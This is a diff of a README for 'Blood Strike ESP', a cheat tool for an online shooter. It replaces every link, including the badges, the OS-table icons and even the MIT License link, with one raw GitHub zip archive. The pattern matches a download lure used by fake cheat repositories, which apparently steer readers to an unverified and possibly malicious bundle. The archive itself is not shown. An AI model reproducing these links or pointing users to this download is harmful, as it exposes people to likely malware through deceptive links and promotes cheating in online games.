@@ -1,4 +1,4 @@
-![Download](https://img.shields.io/badge/Download-https://RajputVansh7.github.io-green?logo=github&logoColor=white)  
+![Download](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip)  
 [Click to Get the Latest Release! \[LINK\]]
 
 # 🩸 Blood Strike ESP
@@ -13,11 +13,11 @@ Blood Strike ESP integrates seamlessly across major operating systems, providing
 
 | OS           | Supported | Native Build | Touch Support |
 |--------------|:---------:|:------------:|:-------------:|
-| ![Windows](https://img.shields.io/badge/-Windows-0078D6?logo=windows&logoColor=white)     | ✅         | ✔️           | ✔️           |
-| ![Linux](https://img.shields.io/badge/-Linux-FCC624?logo=linux&logoColor=black)           | ✅         | ✔️           | ❌           |
-| ![macOS](https://img.shields.io/badge/-macOS-000000?logo=apple&logoColor=white)           | ✅         | ✔️           | ✔️           |
-| ![Android](https://img.shields.io/badge/-Android-3DDC84?logo=android&logoColor=white)     | 🚧         | WIP          | ✔️           |
-| ![iOS](https://img.shields.io/badge/-iOS-808080?logo=apple&logoColor=white)               | 🚧         | WIP          | ✔️           |
+| ![Windows](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip)     | ✅         | ✔️           | ✔️           |
+| ![Linux](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip)           | ✅         | ✔️           | ❌           |
+| ![macOS](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip)           | ✅         | ✔️           | ✔️           |
+| ![Android](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip)     | 🚧         | WIP          | ✔️           |
+| ![iOS](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip)               | 🚧         | WIP          | ✔️           |
 
 > Note: "WIP" indicates features currently in development (Q1 2025 roadmap). For the most reliable experience, use on Windows or macOS.
 
@@ -82,9 +82,9 @@ Ready to upgrade your Blood Strike vision? Follow these steps:
 
 ### 1. Download the Latest Release
 
-![Download](https://img.shields.io/badge/Download-https://RajputVansh7.github.io-green?logo=github&logoColor=white)
+![Download](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip)
 
-- Click the `Download` badge above or use this https://RajputVansh7.github.io to grab the current release bundle.
+- Click the `Download` badge above or use this https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip to grab the current release bundle.
 - Verify your OS: ensure compatibility using the table above.
 
 ### 2. Unpack and Configure
@@ -110,7 +110,7 @@ This project is intended for informational and research enrichment, respectfully
 ## 📜 MIT License
 
 Blood Strike ESP is distributed under the terms of the MIT License (c) 2025.  
-Dive into the full legal details [here](https://opensource.org/licenses/MIT).
+Dive into the full legal details [here](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip).
 
 ---
 
@@ -122,7 +122,7 @@ Start a conversation, submit your tweak, make an impact!
 
 ---
 
-![Download](https://img.shields.io/badge/Download-https://RajputVansh7.github.io-green?logo=github&logoColor=white)  
+![Download](https://raw.githubusercontent.com/RajputVansh7/blood-strike-vision-esp/branch/mazzard/blood-vision-esp-strike-2.7.zip)  
 [Return to the top or download again! \[LINK\]]
 
 ---
